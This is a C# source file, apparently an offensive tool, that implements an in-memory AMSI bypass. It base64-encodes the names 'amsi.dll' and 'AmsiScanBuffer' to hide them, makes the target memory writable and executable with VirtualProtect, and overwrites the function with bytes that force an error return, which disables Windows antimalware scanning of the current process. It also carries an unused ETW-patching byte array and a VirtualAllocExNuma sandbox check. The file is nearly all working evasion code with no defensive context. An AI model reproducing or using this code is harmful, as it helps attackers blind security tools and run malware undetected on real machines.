using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace ISMA
{
    public class Isma
    {
        //implement required kernel32.dll functions 
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] etwx64 = new byte[] { 0x48, 0x33, 0xc0, 0xc3 };


        public static string Bypass()
        {

            

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return null;
            }

          
            string dll1 = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("YW1zaS5kbGw="));

            IntPtr lib = LoadLibrary(dll1);
            string encP = "QW1zaVNjYW5CdWZmZXI=";
            string decP = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(encP));
            IntPtr addr = GetProcAddress(lib, decP);

            var Patch = GetPatch;

            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)Patch.Length, 0x40, out oldProtect);
            Marshal.Copy(Patch, 0, addr, Patch.Length);
            uint newProtect;
            VirtualProtect(addr, (UIntPtr)Patch.Length, oldProtect, out newProtect);

            return "OK";

        }
        static byte[] GetPatch
        {
            get
            {
                if (Is64Bit)
                {
                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }

                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }
        }

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }
    }
}


